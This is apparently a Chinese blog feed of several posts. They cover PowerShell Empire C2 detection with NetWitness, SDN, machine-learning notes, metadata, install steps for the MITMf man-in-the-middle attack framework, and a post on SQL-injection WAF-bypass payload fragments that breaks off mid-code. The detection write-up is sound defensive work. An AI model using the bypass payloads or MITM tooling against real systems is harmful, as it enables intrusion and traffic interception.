检查设备只不过是一种精心设计的中间人攻击，它将加密分成两个独立的加密流。因此，它们仍然为最终用户提供足够级别的保护，同时允许安全分析师和设备在发生恶意或不需要的活动时正确监控和发出警报，例如此处显示的 Web Shell。总之，如果您负责保护组织的资产，则绝对应该考虑使用该技术的利弊。分析人员通过将重点放在寻找通过 HTTP 的 C2 流量开始他们的调查。然后，分析师可以通过使用服务分析元键来研究分离协议的特征。从这里他们注意到了一些有趣的元值，http with binary并且http post no get no referer directtoip：</span><br><span class="line"></span><br><span class="line">&gt;将会话数量减少到更易于管理的数量后，分析师可以查看其他元键以查看是否有任何有趣的工件。查看Filename, Directory, Client Application,和Server Application元键，并观察到通信始终来自同一用户代理的 microsft-iis/7.5 服务器，以及 PHP 文件的子集：</span><br><span class="line"></span><br><span class="line">&gt;分析人员决定将此作为枢轴点，并删除一些其他更精细的查询，以专注于与那些 PHP 文件、来自该用户代理和该 IIS 服务器版本的所有通信。分析师现在观察到额外的通信：</span><br><span class="line"></span><br><span class="line">&gt;开可视化，分析人员可以查看通信的节奏并观察到有一个信标类型的模式：</span><br><span class="line">转向事件分析视图，分析人员可以查看更多细节，看看是否有人怀疑这是恶意的。分析人员观察到有效负载的变化很小，并且每 4 分钟发生一次连接：</span><br><span class="line">分析师重构了一些会话以查看正在传输的数据类型，分析师观察到各种可疑的 GET 和 POST 以及正在传输的不同数据：</span><br><span class="line">分析师根据他们执行的分析确认此流量高度可疑，分析师随后决定使用应用程序规则跟踪活动。为此，分析人员查看与此流量关联的元数据，并找到识别此类流量的唯一元数据组合：(service = 80) &amp;&amp; (analysis.service = &#x27;http1.0 unsupported cache header&#x27;) &amp;&amp; (analysis.service = &#x27;http post missing content-type&#x27;)</span><br><span class="line"></span><br><span class="line">&gt;重要提示： 应用程序规则对于跟踪活动非常有用。然而，它们是非常特定于环境的，因此在一个环境中使用的应用程序规则可能具有高保真度，但在另一个环境中使用时，可能会产生令人难以置信的噪音。创建或使用应用程序规则时应小心，以确保它们在您的环境中正常工作。</span><br><span class="line"></span><br><span class="line">&gt;使用 RSA NetWitness 端点跟踪数据进行检测,分析师每天都应该仔细阅读 IOC、BOC 和 EOC 元密钥以查找可疑活动。这样做后，他们观察元数据，browser runs powershell并开始调查：转向事件分析视图，分析人员可以看到 Internet Explorer 产生了 PowerShell，然后是执行的 PowerShell：</span><br><span class="line"></span><br><span class="line">&gt;分析人员决定对 base64 进行解码，以便更好地了解 PowerShell 正在执行什么。分析师观察到 PowerShell 正在设置 Web 请求，并且可以看到它将为所述请求提供的参数。从这里，分析师可以利用这些信息并开始在他们的数据包数据中寻找这方面的指标（这证明了拥有端点和数据包解决方案背后的力量）：</span><br><span class="line"></span><br><span class="line">&gt;在启动的 PowerShell 上进行透视，还可以查看执行的 whoami 和 任务列表 。这将帮助分析师描绘出攻击者在做什么：</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>文中概述的流量是 PowerShell Empire 的默认配置；因此，根据谁设置 PowerShell Empire 的实例，指标可能会有所不同。话虽如此，C2 仍需要签入，C2 仍需要部署其有效负载，C2 仍将在端点上执行可疑任务。分析师只需要了解其中一项活动即可开始拉动线程并解除攻击者的活动，还需要注意的是，PowerShell Empire 网络流量解密起来很麻烦。因此，拥有一个端点解决方案（例如 NetWitness Endpoint）非常重要，它可以为您跟踪在端点上执行的活动。</p><h1 id="进一步的工作"><a href="#进一步的工作" class="headerlink" title="进一步的工作"></a>进一步的工作</h1><p>编写一个脚本来抓取Censys.io数据以寻找 PowerShell Empire 的实例。附加的 Python 脚本查询 Censys.io API 以查找特定的正文请求哈希，然后收集有关 C2 的信息，包括：</p><ol><li>托管服务器信息</li><li>PS1 脚本</li><li>C2信息</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SDN 软件定义网络</title>
      <link href="/josyaaa/2022/05/12/SDN/"/>
      <url>/josyaaa/2022/05/12/SDN/</url>
      
        <content type="html"><![CDATA[<p>SDN:一种大规模网格设计、构建、运维的方法，利用了中央服务器中的软件对路由器和交换机的转发决策进行编程</p><h1 id="SDN-功能"><a href="#SDN-功能" class="headerlink" title="SDN 功能"></a>SDN 功能</h1><p><strong>路由器转发分组要素：控制功能 数据功能</strong></p><ul><li>控制功能：负责决定数据流的路由以及各条流的相对优先级</li><li>数据功能：负责根据控制功能的决策来转发数据</li></ul><p><strong>SDN中：中央控制器完成所有复杂的功能，包括路由、命名、策略声明、安全性检查</strong></p><h2 id="主动因素"><a href="#主动因素" class="headerlink" title="主动因素"></a>主动因素</h2><p>服务器虚拟化：在本质上是隐藏了服务器资源，包括：物理服务器、处理器、操作系统的数量及标识，可以实现多台服务器而且每个服务器都保留相应的硬件资源，也可以实现快速迁移从而实现负载均衡、服务器故障的动态切换</p><p><strong>服务器虚拟化带来的问题：</strong></p><ol><li>配置虚拟局域网</li><li>流量模式</li></ol><p><strong>网络功能虚拟化的问题：</strong></p><ol><li>在高性能硬件上利用标准的虚拟化技术对网络功能进行虚拟化，可以适用于任意有限或无线网络中的数据平面处理和控制平面功能</li></ol><p><strong>SDN NFV有许多共同的特征：</strong></p><ol><li>将功能迁移到软件中实现</li><li>适用商用硬件平台来替代专用平台</li><li>适用标准化或开放的应用程序编程接口（API）</li><li>支持更高效的网络功能演化、部署、位置调整</li></ol><ul><li>SDN 将网络流量控制的数据平面分离开来，使得数据流的控制和路由变得更加灵活和高效</li><li>NFV 将网络功能从特定硬件平台分离出来，从而使这些功能更加高效和灵活的实现</li></ul><p><strong>SDN NFV的关系：</strong></p><ol><li>网络的数据平面功能在虚拟机上实现</li><li>控制平面的功能可以在专用的SDN平台或者SDN虚拟机上实现</li><li>SDN控制器都要与运行在虚拟机上的数据平面进行交互</li></ol><p><strong>QoS 测度：</strong></p><p>用于不同网络用户指定相应的服务和设定网络的流量管理策略</p><ul><li>如果采用NFV而没有适用SDN，QoS的设置由虚拟机来完成</li><li>如果采用SDN，SDN控制器都将负责实施QoS参数</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>实验目录</title>
      <link href="/josyaaa/2022/05/12/network_seeurity/"/>
      <url>/josyaaa/2022/05/12/network_seeurity/</url>
      
        <content type="html"><![CDATA[<hr><table><thead><tr><th>漏洞与攻击实验（基于Liunx系统）</th></tr></thead><tbody><tr><td>漏洞区溢出漏洞</td></tr><tr><td>返回库函数攻击</td></tr><tr><td>格式化字符串漏洞</td></tr><tr><td>静态条件漏洞</td></tr><tr><td>Set-UID 设置程序漏洞</td></tr><tr><td>改变根目录沙盒漏洞</td></tr><tr><td>伪造跨站请求攻击</td></tr><tr><td>跨站脚本攻击</td></tr></tbody></table><hr><table><thead><tr><th>漏洞与攻击实验（基于Liunx系统）</th></tr></thead><tbody><tr><td>SQL 注入攻击</td></tr><tr><td>点击劫持攻击</td></tr><tr><td>TCP&#x2F;IP 攻击</td></tr><tr><td>DNS 嫁接攻击</td></tr></tbody></table><hr><table><thead><tr><th>探究实验（基于Liunx系统）</th></tr></thead><tbody><tr><td>包嗅探和欺骗</td></tr><tr><td>可插入身份验证模块</td></tr><tr><td>web 访问控制</td></tr><tr><td>SYN Cookie</td></tr><tr><td>Linux 基于容量的（Capability）访问控制</td></tr><tr><td>密钥加密</td></tr><tr><td>单向散列函数</td></tr><tr><td>公钥基础设施</td></tr><tr><td>Liunx防火墙探测</td></tr></tbody></table><hr><table><thead><tr><th>设计与实现（基于Liunx系统）</th></tr></thead><tbody><tr><td>虚拟专用网（Liunx）</td></tr><tr><td>IPSec（Minix）</td></tr><tr><td>防火墙（Liunx）</td></tr><tr><td>基于角色控制器（Minix）</td></tr><tr><td>基于容量的（Capability-based）连接控制（Minix）</td></tr><tr><td>加密文件系统（Minix）</td></tr><tr><td>地址空间随即化（Minix）</td></tr><tr><td>集随机 UID 沙盒（Minix）</td></tr></tbody></table><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>线性模型在训练中的细节</title>
      <link href="/josyaaa/2022/05/12/model_02/"/>
      <url>/josyaaa/2022/05/12/model_02/</url>
      
        <content type="html"><![CDATA[<h2 id="线性模型"><a href="#线性模型" class="headerlink" title="线性模型"></a>线性模型</h2><p>线性模型优点是形式简单，易于建模。同时有形式更为强大的非线性模型通过在线性模型的基础上引入层级结构或高维映射得出，其中w表达属性在预测中的重要性，具有很高可解释性数据集可分为：<br>    (回归&#x3D;‘预测’分类&#x3D;‘标注’)</p><h2 id="线性模型进行回归任务"><a href="#线性模型进行回归任务" class="headerlink" title="线性模型进行回归任务"></a>线性模型进行回归任务</h2><ol><li>给定数据集中使用线性回归模型以尽可能准确地预测实值输出标记，先讨论“二分类问题”，此时我们忽略属性的下标，对离散属性，若属性间存在“序“关系可通过连续化将其转化为连续值，使用“0 1“进行转化或者”0 0.5 1“属性转化。</li><li>如何确定w和b，本质来说是如何衡量f(x)与y之间的差别，我们可以使用均方误差对回归进行性能度量，同时均方误差对应的具体方法是：欧几里得距离、最小二乘法等，对于多元线性回归，就需要引入矩阵思想是把数据看作矩阵，可分为正定矩阵或满秩矩阵以及逆矩阵的情况，现实中往往不会是满秩矩阵以为我们会遇到大量的变量、其数目甚至超过样本本身，从矩阵角度看就是列多于行，就会得出多个w所以这个时间就需要引入正则化项。</li><li>当我们把线性模型预测值逼近于真实标记y时，就要把对数作为线性模型逼近的目标其实就是对数线性模型，求取输入空间到输出空间的非线性函数映射，其中对数函数是起到预测值与真实标记联系的作用</li><li>广义线性模型的参数估计是通过加权最小二乘法或极大似然法进行，其中对数线性模型是广义线性模型的特例</li></ol><h2 id="线性模型进行分类任务"><a href="#线性模型进行分类任务" class="headerlink" title="线性模型进行分类任务"></a>线性模型进行分类任务</h2><ol><li>对于二分类任务将数据集转化为“0 1”，“0 0.5 1”的值，理想状态是“单位阶跃函数“，预测值大于0是正例，小于0是反例，预测值为0可以任意判断，因为单位阶跃函数不连续所以不能直接用作式中，可以使用对数几率函数进行替代同时对数几率函数其实是‘Sigmoid函数’，其实是将正例与反例的比值反映x作为正例的可能性，对几率对数则取得到”对数几率“，所以实际是在用线性回归模型的预测结果去逼近真实标记的对数几率&#x3D;”对数几率回归模型-Logit regression“，尽管是回归的name，其实是分类学习方法</li><li>”对数几率回归模型-Logit regression“的优点是无需事先假设数据分布，可以预测出“类别”还可以得到近似概率预测</li><li>”对数几率回归模型-Logit regression“的模型优化（对率回归求解的目标函数是任意阶可凸函数），可以通过极大似然法来对数据集进行对率回归模型最大化“对数似然，同时经典的数值优化算法如：梯度下降法、牛顿法等都可以求得其最优解</li><li>“线性判别分析-Linear Discriminant Analysis”，LDA与Fisher模型的不同在于LDA假设各类样本的协方差矩阵相同且满秩，LDA就是在train data上面设法将样例投影到一条直线上使得同类样例的投影点尽可能接近、异类样例尽量远离，在对新样本进行分类将其投影到同样的直线上面，以此进行不断迭代。</li><li>若希望LDA上面的投影点尽可能接近，可以使协方差可能下相反若使异类样例的投影点远离可让类中心之间的距离近可能最大，考虑异类、同类可得到与最大化的目标为“类内散度矩阵”和“类间散度矩阵”，将两者进行比值为LDA欲最大化目标，即“广义瑞利商”&#x3D;w</li><li>如何确定w，因为分子、分母都是关于w的二次项因此与w的长度无关，只与其方向有关，不失一般性引入拉格朗日乘子法，实际中考虑数值解的稳定性是对Sw进行奇异值分解。LDA也可以从贝叶斯决策的角度阐述并证明，当两分类data同先验、满足高斯分布且协方差相等时，LDA可达最优</li><li>LDA推广到多分类任务中，假定存在N类，且第i类示例数为Mi，定义为“全局散度矩阵”，同时多分类的LDA有多种角度实现方法使用Sb，Sw,St三者中任何两种即可，常见的一种实现是采用优化目标</li><li>若将W视为投影矩阵，则多分类LDA可以通过投影来减少样本点的维数，且投影过程中使用了类别信息，因此LDA也常是监督降温技术</li></ol><h2 id="线性模型进行多分类任务"><a href="#线性模型进行多分类任务" class="headerlink" title="线性模型进行多分类任务"></a>线性模型进行多分类任务</h2><ul><li>多分类学习的思路是“拆解法”也就将每个二分类任务训练为若干个二分类任务求解，在测试时对这些分类器的预测结果进行集成以获得最终的多分类结果。<br>拆分策略分为“O VS O”“O VS R”“M VS M”,</li><li>“O VS O”就是将N个类别进行两两配对产生N&#x2F;(N-1)&#x2F;2个分类结果，最终结果可通过投票产生即把被预测得最多的类别作为最终分类结果；“O VS R”是每次将一个类的样例作为正例、所有其他类的样例作为反例来训练Ｎ个分类器，在测试时若仅有一个分类预测为正类则对应的类别标记作为最终分类结果但是如果有多个分类器预测为正类，则通常考虑各分类器的预测置信度，选择置信度最大类别标记作为分类结果。</li><li>“M VS M”是将每个若干个类作为正类，若干个类其他类作为反类，最常用的“M VS M”J技术“纠错输出码”即是ＥＣＯＣ，ＥＣＯＣ工作过程分为编码、解码两部分，其中编码是对Ｎ个类做Ｍ次划分，每次产生正类和反类，形成二分类训练集，共产生Ｍ个训练集训练出Ｍ个分类器，解码是对Ｍ个分类器进行预测，将这个编码与每个类别进行各自编码比较，返回其中距离最小的类别为预测最终结果。类别划分“编码矩阵”指定，“编码矩阵”有多种形式主要有二元码（正、反类）、三元码（正、反、停用类）。</li></ul><h3 id="为什么要叫做“纠错输出码”"><a href="#为什么要叫做“纠错输出码”" class="headerlink" title="为什么要叫做“纠错输出码”"></a>为什么要叫做“纠错输出码”</h3><p>因为测试阶段，ＥＣＯＣ编码对分类器的错误很有容忍度和修正能力，ＥＣＯＣ编码越长，纠错能力越强，然而编码越长意味着所需训练的分类器越多，计算、存储开销都会越大，但是对于同等长度的编码上来说，任意两个类别之间的编码距离越远，则纠错能力越强，因此在码长较小时可根据这个原则计算出理论最优编码。<br>类别不平衡问题：在分类任务中不同类别的训练样例数目差别很大的情况。<br>“训练集是真实样本总体的无偏采样“这个假设往往不成立，因为真实训练集未必有效基于训练集观测几率来进行推断所以目前技术有三类做法：“欠采样”、“过采样”、“阈值移动”</p><ul><li>“欠采样”是直接对训练集中反例进行训练就是去除一些反例使得正、反数目接近再进行学习</li><li>“过采样”是直接对训练集中正例进行训练就是增加一些正例、反例数目接近然后在进行学习</li><li>“阈值移动”是对原始训练集进行训练，但在用训练好的分类器进行预测时将“再缩放”嵌入到其决策过程中</li></ul><h3 id="欠采样-｜-过采样"><a href="#欠采样-｜-过采样" class="headerlink" title="欠采样 ｜ 过采样"></a>欠采样 ｜ 过采样</h3><p>“欠采样”的时间开销远小于“过采样”，前者是丢弃很多反例，后者是增加很多正例，但是“过采样”不能随便对初始正例样本进行重复采样会导致“过拟合”的发生。<br>“过采样”的代表算法ＳＭＯＴＥ是通过对ｔｒａｉｎ中正例进行插值来产生额外的正例，“欠采样”的代表算法ＥａｓｙＥｎｓｅｍｂｌｅ则是利用集成学习机制将反例划分为若干个集合供不同学习器使用，看起来都使用了“欠采样”可从全局来看不会丢失重要信息</p><h3 id="多分类学习"><a href="#多分类学习" class="headerlink" title="多分类学习"></a>多分类学习</h3><p>多分类学习中每个样本仅属于一个类别，但是如果每个样本同时预测多个类别标记则是多标记学习。<br>“再缩放”也是“代价敏感学习”的基础，“代价敏感学习研究最多的是基于类别的“误分类代价”</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>决策树在训练中的细节</title>
      <link href="/josyaaa/2022/05/12/mdel_01/"/>
      <url>/josyaaa/2022/05/12/mdel_01/</url>
      
        <content type="html"><![CDATA[<p>决策树是基于树结构来进行决策，也恰好是人类在面临决策问题时一种很自然的处理机制，一般的一颗决策树包含一个根节点、若干个内部节点、若干个叶节点，叶节点对应于决策结果，其他每个结点则对应于一个属性测试，其中每个节点包含的样本集合根据属性测试的结果被划分到子节点中，根节点包含样本全集，从根节点到每个叶节点的路径对应一个判定测试序列。</p><h2 id="决策树的目的"><a href="#决策树的目的" class="headerlink" title="决策树的目的"></a>决策树的目的</h2><p>决策树的目的时产生一颗泛化能力强可以处理未见示例能力强的决策树，基本流程遵循“分而治之“，决策树本质是”递归过程“，但是在决策树中导致递归返回的情况有三种:</p><ol><li>当前节点包含的样本全属于同一类别不需要划分</li><li>当前属性集为空或是所有样本在所有属性上取值相同无法划分<br>3.当前节点的样本集为空不能划分,对于2我们常常是利用当前节点的“后验分布“，对3我们常常是把父节点的样本分布作为当前节点的“先验分布”</li></ol><h2 id="决策树划分选择"><a href="#决策树划分选择" class="headerlink" title="决策树划分选择"></a>决策树划分选择</h2><p>决策树学习的关键是如何选择最优划分属性，我们希望决策树的分支节点所包含的样本尽可能属于同一类别也就是节点的“纯度“越高</p><h2 id="“纯度“的方法"><a href="#“纯度“的方法" class="headerlink" title="“纯度“的方法"></a>“纯度“的方法</h2><ul><li>“信息增益“是度量样本集合纯度最常用的指标，”信息增益“越高意味着属性进行划分所获的”纯度“越高，所以用”信息增益“来进行决策树的划分属性选择，ID3就是以”信息增益“为准则划分属性，但是”信息增益“对取值数目较多的属性有所偏好，为减少偏好所带来的影响，C4.5不直接使用”信息增益“而是使用“增益率“来选择最优划分属性，然而”增益率“对样本较少的属性有所偏好，因此C4.5不是直接选择”增益率“最大的候选划分属性，而是使用启发式，先从候选划分属性中找出”信息增益“高于平均水平的属性，在从中选择”增益率“较高的属性</li><li>“基尼指数“是反映data中随机抽取两个样本，其类别不一致的概率”基尼指数“越小data的纯度越高，最下属性即为最优划分属性，CART就是用”基尼指数“来选择划分属性的，同时可以应用于”分类“和”回归“任务</li><li>“剪枝处理“是对于决策树”过拟合“的主要方法，因为在尽量正确分类的过程中会造成决策树分支过多，就导致train自身将一些特点当作普遍特点就会造成”过拟合“所以就需要主动去掉一些分支来降低过拟合的风险。其中”剪枝处理“的策略有”预剪枝“和”后剪枝“，”预剪枝“是指在决策树过程中对每个节点划分先进行估计，当前节点不能带来决策泛化性能提升则停止并将当前节点标记为叶节点；”后剪枝“则是在train中生成完整的决策树然后自底向上对非叶节点进行考察，如果能将对应子树替换为叶节点能够提高决策树的泛化能力就将子树替换为叶节点</li></ul><h2 id="如果判断决策树泛化性能的提升"><a href="#如果判断决策树泛化性能的提升" class="headerlink" title="如果判断决策树泛化性能的提升"></a>如果判断决策树泛化性能的提升</h2><h2 id="可以预留部分test以进行性能的评估"><a href="#可以预留部分test以进行性能的评估" class="headerlink" title="可以预留部分test以进行性能的评估"></a>可以预留部分test以进行性能的评估</h2><ul><li>“预剪枝“是基于”信息增益“，”预剪枝“使得决策树的很多分支都没有”展开“这不仅降低了过拟合的风险还减少了决策树训练的开销和测试时间开销，但是有些分支的当前划分虽然不能提升泛化性能甚至可能导致泛化性能暂时下降但在其基础上进行后续划分可能导致性能显著提升但是由于”预剪枝“本质上”贪心“禁止分支展开会带来”欠拟合“风险</li><li>“后剪枝“比”预剪枝“保留更多的分支但是”欠拟合“的风险很小泛化性能优于但是在生产完全决策树之后要对决策树自底向上进行检查，所以时间开销就很大。</li></ul><h2 id="决策树中连续值怎样处理"><a href="#决策树中连续值怎样处理" class="headerlink" title="决策树中连续值怎样处理"></a>决策树中连续值怎样处理</h2><p>现实学习任务常常遇到连续属性，并且连续属性的可取值数目不再有限就不能直接对连续属性的可取值来对节点进行划分就需要连续属性离散化，最常用二分类法对连续值属性进行处理，C4.5采用的也是这样机制，与离散属性节点划分不同连续属性划分该属性还可作为其后代节点划分属性。</p><h2 id="决策树怎样缺失值处理"><a href="#决策树怎样缺失值处理" class="headerlink" title="决策树怎样缺失值处理"></a>决策树怎样缺失值处理</h2><p>现实中样本总会是不那么完美的就会有样本的属性缺失值问题产生，但是如果简单放弃大量缺失值使用无缺失部分来train，对data来说是非常大的浪费。如果我们要参与缺失值就需要解决两个问题：</p><ul><li>如何在属性缺失情况下进行划分属性选择？</li></ul><p>1、Data里面属性并没有缺失值问题就只需要需要判断属性的优略即可<br>2、Data里面属性中的属性子集所占比<br>3、Data里面属性中属性子集取值为属性方所占的比<br>（ 三种所占比都为1，可以给每个样本赋予一个权重去定义，通过调整权重参数去解决属性缺失值如何进行划分属性的问题 ）</p><ul><li>在给定划分属性上面且有缺失值如何进行样本划分？</li></ul><p>1、对每个样本划入与其取值对应的子节点，且样本的权值在子节点中保持为特定的参数，若每个样本划分属性上的取值未知，就需要将每个样本划分所有子节点中调整为权重*（无缺失值样本中在属性上取值属性子集的样本所占比例）<br>2、多变量决策树是使用斜的划分而不是轴划分，这样就可以实现较为复杂的多变量决策树划分，与单变量决策树不同的是多变量决策树不是为每一个非叶点寻找一个最优划分属性而是试图建立一个合适的线性分类器，OCI先贪心的寻找每个属性的最优权值，在局部优化的基础上再对分类边界进行随机扰动以试图找到更好的边界；<br>3、直接引入线性分类器的最小二乘法，还有将再决策树节点上嵌入神经网络，所以结合这两种优势就有了“感知机“、”神经网络“<br>4、“增量学习“有些决策树可以进行，”增量学习“就是接收到新样本后可对已学得的模型进行调整而不用重新学习，主要是通过调整分支路径上的划分属性次序来对树进行部分重构，ID4、ID5R、ITI等，可以有效降低每次接收到新样本后训练时间开销但多步增量学习后的模型会基于全部数据训练model会有差别。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>了解元数据</title>
      <link href="/josyaaa/2022/05/12/metadata/"/>
      <url>/josyaaa/2022/05/12/metadata/</url>
      
        <content type="html"><![CDATA[<ol><li>描述性元数据支持资源的发现、识别和选择。它可以包括标题、作者和主题等元素。</li><li>管理元数据有助于资源的管理。它可以包括技术、保存、权利和使用等要素。</li><li>结构元数据，通常用于机器处理，描述资源各个部分之间的关​​系，例如书中的章节。</li></ol><p><a href="https://guides.lib.utexas.edu/metadata-basics/harvesting">Metadata Basics</a><br><a href="https://nsdl.oercommons.org/">THE NATIONAL SCIENCE DICITAL LIBRARY</a></p><h2 id="元数据重要性"><a href="#元数据重要性" class="headerlink" title="元数据重要性"></a>元数据重要性</h2><p><a href="https://www.opendatasoft.com/en/blog/what-is-metadata-and-why-is-it-important-data/">what is metadata and why is it as important as the data itself ?</a><br><a href="https://www.opendatasoft.com/en/blog/all-you-need-to-know-about-metadata">all you need t know but metadata ?</a></p><h2 id="元数据基本问题"><a href="#元数据基本问题" class="headerlink" title="元数据基本问题"></a>元数据基本问题</h2><ul><li>元数据需要回答“谁、什么、何地、何时以及为什么”</li><li>元数据提供一个标准格式以实现互惠操作性，提高数据质量并促进数据的更多使用</li></ul><h2 id="元数据增强数据重用"><a href="#元数据增强数据重用" class="headerlink" title="元数据增强数据重用"></a>元数据增强数据重用</h2><ul><li>类</li><li>实例</li><li>事物之间的关系</li><li>事物的属性</li><li>与事物相关的功能、过程、约束和规则</li></ul><h2 id="价值元数据"><a href="#价值元数据" class="headerlink" title="价值元数据"></a>价值元数据</h2><ul><li>数据质量与数据的来源有关。如果没有元数据来提供出处，就有一个没有上下文的数据集。没有上下文的数据，如人工制品、化学品、小苏打或任何其他随机对象，几乎没有价值。</li><li>元数据本身就非常有用。元数据可以提供指向数据集的指针，即使没有实际数据。可以围绕给定主题存在的数据整理出一个组织结构图。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Riechert, Mathias, et al. “Developing Definitions of Research Information Metadata as a Wicked Problem? Characterisation and Solution by Argumentation Visualisation.” Program 50.3 (2016).</span><br><span class="line"></span><br><span class="line">S. Ram and J. Liu, “A Semiotics Framework for Analyzing Data Provenance Research,” Journal of Computing Science and Engineering, vol. 2, pp. 221-248, 2008.)</span><br><span class="line"></span><br><span class="line">Wilson, Samuel P. Developing a metadata repository for distributed file annotation and sharing. Diss. PURDUE UNIVERSITY, 2015.</span><br><span class="line"></span><br><span class="line">Polleres, Axel and Simon Steyskal. “Semantic Web Standards for Publishing and Integrating open data.” Standards and Standardization: Concepts, Methodologies, Tools, and Applications (2015): 1.</span><br><span class="line"></span><br><span class="line">Daraio, Cinzia, et al. “The advantages of an Ontology-Based Data Management Approach: Openness, Interoperability, and Data Quality.” Scientometrics (2016): 1-15.</span><br><span class="line"></span><br><span class="line">Fukuta, Naoki. “Toward an Agent-Based Framework for Better Access to open data by Using Ontology Mappings and their Underlying Semantics.” Advanced Applied Informatics (IIAI-</span><br><span class="line">AAI), 2015 IIAI 4th International Congress. IEEE, 2015.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安装 MITMF tools</title>
      <link href="/josyaaa/2022/05/12/MITMF/"/>
      <url>/josyaaa/2022/05/12/MITMF/</url>
      
        <content type="html"><![CDATA[<h1 id="how-to-install-MITMF-in-kali-liunx"><a href="#how-to-install-MITMF-in-kali-liunx" class="headerlink" title="how to install MITMF in kali liunx"></a>how to install MITMF in kali liunx</h1><p>MITMf – 中间人攻击框架</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>MITMf 旨在为中间人攻击和网络攻击提供一站式服务，同时更新和改进现有的攻击和技术<br>它最初是为了解决其他工具（例如 Ettercap、Mallory）的重大缺陷而构建的，它几乎完全从头开始重写，以提供一个模块化且易于扩展的框架，任何人都可以使用它来实现自己的 MITM 攻击</p><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><ul><li>该框架包含一个内置的 SMB、HTTP 和 DNS 服务器，可以由各种插件控制和使用，它包含 SSLStrip 代理的修改版本，允许 HTTP 修改和部分 HSTS 绕过</li><li>从 0.9.8 版开始，MITMf 支持主动数据包过滤和操作（基本上是 etterfilters 所做的，只是更好），允许用户修改任何类型的流量或协议</li><li>配置文件可以在 MITMf 运行时即时编辑，更改将通过框架传递：这允许您在执行攻击时调整插件和服务器的设置</li><li>MITMf 将使用运行在启动</li><li>响应程序集成允许 LLMNR、NBT-NS 和 MDNS 中毒以及 WPAD 流氓服务器支持</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. sudo -i</span><br><span class="line">2. apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="line">3. apt-get install python-dev-is-python2 python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone4 libcapstone-dev -y</span><br><span class="line">4. curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py</span><br><span class="line">5. python get-pip.py</span><br><span class="line">6. pip2 install virtualenvwrapper</span><br><span class="line">7. export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python</span><br><span class="line">8. source `which virtualenvwrapper.sh`</span><br><span class="line">9. mkvirtualenv MITMf -p /usr/bin/python2.7</span><br><span class="line">10. git clone https://github.com/byt3bl33d3r/MITMf</span><br><span class="line">11. cd MITMf &amp;&amp; git submodule init &amp;&amp; git submodule update – recursive</span><br><span class="line">12. pip2 install -r requirements.txt</span><br><span class="line">13. pip2 install pyinotify configobj twisted pillow pefile python-magic capstone</span><br><span class="line">14. python mitmf.py -v</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>How to bypass 是 web</title>
      <link href="/josyaaa/2022/05/12/MYSQL-Bypass/"/>
      <url>/josyaaa/2022/05/12/MYSQL-Bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>利用WEB程序缺陷，容器特性,网络协议，数据库特性来组合利用绕过</p><h1 id="常见"><a href="#常见" class="headerlink" title="常见"></a>常见</h1><ol><li>HTTP协议</li><li>大小混写</li><li>替换</li><li>使用特殊字符</li><li>使用编码</li><li>等价替换</li><li>容器特性</li><li>白名单</li><li>缓冲溢出</li><li>…</li></ol><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><ol><li>构造畸形数据包</li><li>编码</li><li>分块</li><li>数据包溢出</li></ol><h3 id="大小混写"><a href="#大小混写" class="headerlink" title="大小混写"></a>大小混写</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UnIon SlEct</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ununionion seselectlect</span><br><span class="line"></span><br><span class="line">un/**/ion se/**/lect</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">`updatexml`</span><br><span class="line"></span><br><span class="line">and!!!1=1</span><br><span class="line"></span><br><span class="line">/**/</span><br><span class="line"></span><br><span class="line">/*!50000*/</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用编码"><a href="#使用编码" class="headerlink" title="使用编码"></a>使用编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 